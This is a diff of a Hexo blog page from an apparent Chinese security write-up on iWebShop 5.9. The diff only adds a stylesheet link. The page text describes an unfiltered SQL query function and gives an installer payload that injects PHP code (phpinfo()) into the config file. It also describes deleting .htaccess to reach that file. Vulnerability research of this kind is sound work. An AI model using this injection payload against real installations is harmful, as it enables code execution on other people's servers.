@@ -73,7 +73,9 @@
     
 	<!-- mathjax -->
 	
-<meta name="generator" content="Hexo 5.4.2"></head>
+<!-- hexo injector head_end start -->
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">
+<!-- hexo injector head_end end --><meta name="generator" content="Hexo 5.4.2"></head>
 
 <body class="max-width mx-auto px3 ltr">
     
@@ -196,7 +198,6 @@
 <p><img src="/2022/12/22/iWebShop5.9%E5%88%86%E6%9E%90/image-20221222172421246.png" alt="image-20221222172421246"></p>
 <p>可以看到其间没有任何过滤字符就执行了SQL语句，造成SQL注入漏洞</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//执行SQL</span></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">query</span>(<span class="params"><span class="variable">$sql</span></span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="comment">//创建数据库对象</span></span><br><span class="line">		<span class="variable">$dbObj</span> = <span class="title class_">IDBFactory</span>::<span class="title function_ invoke__">getDB</span>();</span><br><span class="line">		<span class="variable">$dbObj</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
-
 <p>之后我们回到商家管理平台，商品列表这里点击删除操作，id对应为5</p>
 <p><img src="/2022/12/22/iWebShop5.9%E5%88%86%E6%9E%90/image-20221222173520933.png" alt="image-20221222173520933"></p>
 <p><img src="/2022/12/22/iWebShop5.9%E5%88%86%E6%9E%90/image-20221222173537058.png" alt="image-20221222173537058"></p>
@@ -219,7 +220,6 @@
 <p><img src="/2022/12/22/iWebShop5.9%E5%88%86%E6%9E%90/image-20221222180632230.png" alt="image-20221222180632230"></p>
 <p>payload</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">db_address=localhost%3A3306&amp;db_user=root&amp;db_pwd=root&amp;db_name=testcms&#x27;,&#x27;evil&#x27;=&gt;phpinfo()))))?&gt;</span><br></pre></td></tr></table></figure>
-
 <p><img src="/2022/12/22/iWebShop5.9%E5%88%86%E6%9E%90/image-20221222181058352.png" alt="image-20221222181058352"></p>
 <p>需要再配合文件删除漏洞删掉config下的.htaccess文件</p>
 <p>再去访问<code>config/config.php</code></p>
